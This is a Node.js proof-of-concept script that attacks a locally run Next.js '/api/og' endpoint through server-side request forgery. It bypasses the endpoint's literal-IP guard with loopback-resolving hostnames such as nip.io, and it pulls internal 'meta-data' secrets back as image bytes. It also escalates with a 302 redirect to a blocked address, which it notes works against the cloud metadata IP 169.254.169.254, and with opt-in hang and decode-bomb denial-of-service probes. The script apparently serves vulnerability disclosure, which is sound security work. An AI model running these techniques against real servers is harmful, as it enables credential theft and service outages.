// Runs the SSRF attack (and its escalations) against YOUR locally-running Next
// server + the local internal-server.mjs, and prints a verdict. All localhost.
//
//   node attack.mjs                 # SSRF reach + content-exfil + redirect bypass
//   DOS=1 node attack.mjs           # ALSO run the DoS probes (hang + decode bomb)
//   NEXT=http://localhost:3000 INTERNAL_PORT=8079 IMG_HOST=localtest.me node attack.mjs
//
// IMG_HOST must be a *hostname* (not a literal IP) that resolves to the loopback
// internal service, so the next/og guard's literal-IP check is bypassed while
// the fetch still lands on 127.0.0.1. Default `127.0.0.1.nip.io` (nip.io maps
// <ip>.nip.io -> <ip>). If nip.io is blocked on your network use `localtest.me`,
// `127-0-0-1.sslip.io`, or an /etc/hosts entry. Do NOT use `localhost`/`*.local`
// — the guard blocks those by name (that is the point).
import crypto from 'node:crypto'
import dns from 'node:dns/promises'

const NEXT = process.env.NEXT || 'http://localhost:3000'
const IPORT = Number(process.env.INTERNAL_PORT || 8079)
const IMG_HOST = process.env.IMG_HOST || '127.0.0.1.nip.io'
const RUN_DOS = process.env.DOS === '1'
const sha = (buf) =>
  crypto.createHash('sha256').update(Buffer.from(buf)).digest('hex').slice(0, 16)

const internal = (path) => `http://${IMG_HOST}:${IPORT}${path}`

async function ogFetch(imgUrl, timeoutMs = 0) {
  const u = `${NEXT}/api/og?title=pwn&img=${encodeURIComponent(imgUrl)}`
  const ctrl = timeoutMs ? AbortSignal.timeout(timeoutMs) : undefined
  const t0 = Date.now()
  try {
    const res = await fetch(u, { signal: ctrl })
    const buf = await res.arrayBuffer()
    return { status: res.status, ms: Date.now() - t0, len: buf.byteLength, hash: sha(buf) }
  } catch (e) {
    const timedOut = e.name === 'TimeoutError' || e.name === 'AbortError'
    return { status: timedOut ? 'TIMEOUT' : 0, ms: Date.now() - t0, error: e.code || e.name || e.message }
  }
}

console.log(`target Next app : ${NEXT}/api/og`)
console.log(`internal service: http://127.0.0.1:${IPORT}  (run: npm run internal)`)
console.log(`img host (vehicle): ${IMG_HOST}\n`)

// --- DNS preflight: make the failure mode diagnostic, not mysterious ---------
let resolved = null
try { resolved = (await dns.lookup(IMG_HOST)).address; console.log(`[dns] ${IMG_HOST} -> ${resolved}`) }
catch (e) { console.log(`[dns] ${IMG_HOST} did NOT resolve (${e.code || e.message}).`) }
if (!(resolved === '127.0.0.1' || resolved?.startsWith('127.'))) {
  console.log(
    `\n[!] ${IMG_HOST} does not resolve to 127.0.0.1 here${resolved ? ` (got ${resolved})` : ''}.` +
    `\n    nip.io may be blocked on your network. Try:` +
    `\n      IMG_HOST=localtest.me node attack.mjs` +
    `\n      IMG_HOST=127-0-0-1.sslip.io node attack.mjs` +
    `\n    or add "127.0.0.1  internal.ssrf-poc.example" to /etc/hosts and use it.\n`
  )
}

// ===================== 1) plain SSRF + content exfil =========================
console.log('\n[1] SSRF, internal secret = RED  :', internal('/latest/meta-data/red'))
const red = await ogFetch(internal('/latest/meta-data/red'))
console.log('    ->', red)
console.log('[2] SSRF, internal secret = BLUE :', internal('/latest/meta-data/blue'))
const blue = await ogFetch(internal('/latest/meta-data/blue'))
console.log('    ->', blue)
console.log('[3] control, LITERAL internal IP (guard should block):', `http://127.0.0.1:${IPORT}/latest/meta-data/red`)
const ctrl = await ogFetch(`http://127.0.0.1:${IPORT}/latest/meta-data/red`)
console.log('    ->', ctrl)

// ===================== 4) ESCALATION: redirect bypass ========================
// A guard-ALLOWED host (IMG_HOST) that 302-redirects to the LITERAL internal IP.
// next/og vets only the initial URL and follows the redirect with no re-check,
// so it reaches the very address rejected in [3]. In cloud this is a clean
// public domain -> 302 -> http://169.254.169.254/... (no attacker DNS needed).
console.log('\n[4] ESCALATION redirect bypass  :', internal('/redirect'), '(302 -> literal 127.0.0.1)')
const redirect = await ogFetch(internal('/redirect'))
console.log('    ->', redirect)

// ===================== 5) ESCALATION: DoS (opt-in) ===========================
let hang, bomb
if (RUN_DOS) {
  console.log('\n[5] ESCALATION DoS probes (DOS=1) — these intentionally degrade the running server')
  console.log('    [5a] hang: upstream never finishes; client gives up at 8s but the SERVER worker stays stuck')
  hang = await ogFetch(internal('/hang'), 8000)
  console.log('        ->', hang)
  console.log('    [5b] bomb: tiny file, huge decode — watch the `npm run internal`/Next memory')
  bomb = await ogFetch(internal('/bomb'), 60000)
  console.log('        ->', bomb)
} else {
  console.log('\n[5] DoS probes skipped. Re-run with:  DOS=1 npm run attack   (they hang a worker / spike memory)')
}

// ============================== VERDICT ======================================
console.log('\n================ VERDICT ================')
const reached = red.status === 200 && blue.status === 200
console.log('SSRF reach (og fetched the internal host)      :', reached ? 'YES' : 'no — internal up? IMG_HOST -> loopback?')
console.log('Internal CONTENT exfiltrated to the attacker   :', reached && red.hash !== blue.hash
  ? 'YES — RED vs BLUE runs returned different PNGs; internal bytes flow back' : 'no / inconclusive')
console.log('Guard blocks the literal-IP control            :', ctrl.status >= 400 || ctrl.status === 0
  ? `YES (HTTP ${ctrl.status}) — guard active; the hostname bypasses it` : `no (HTTP ${ctrl.status})`)
console.log('ESCALATION: redirect -> LITERAL IP is followed :', redirect.status === 200
  ? 'YES — a guard-allowed host that 302s to the blocked literal IP is reached (guard bypassed by redirect)'
  : `no (HTTP ${redirect.status})`)
if (RUN_DOS) {
  console.log('ESCALATION: no fetch timeout (worker hang)     :', hang.status === 'TIMEOUT'
    ? 'YES — server had not responded when the client gave up at 8s (no server-side timeout)' : `inconclusive (${hang.status})`)
  console.log('ESCALATION: tiny-file -> huge-decode           :', (bomb.status === 200 || bomb.status >= 500)
    ? `observed (HTTP ${bomb.status} in ${bomb.ms}ms) — watch server memory; raise BOMB_DIM on the internal server to amplify` : `inconclusive (${bomb.status})`)
}
console.log('=========================================')
console.log('\nWatch the `npm run internal` terminal: the SSRF hits, the /redirect bounce to the')
console.log('LITERAL IP, and (with DOS=1) the /hang and /bomb requests all show there.')
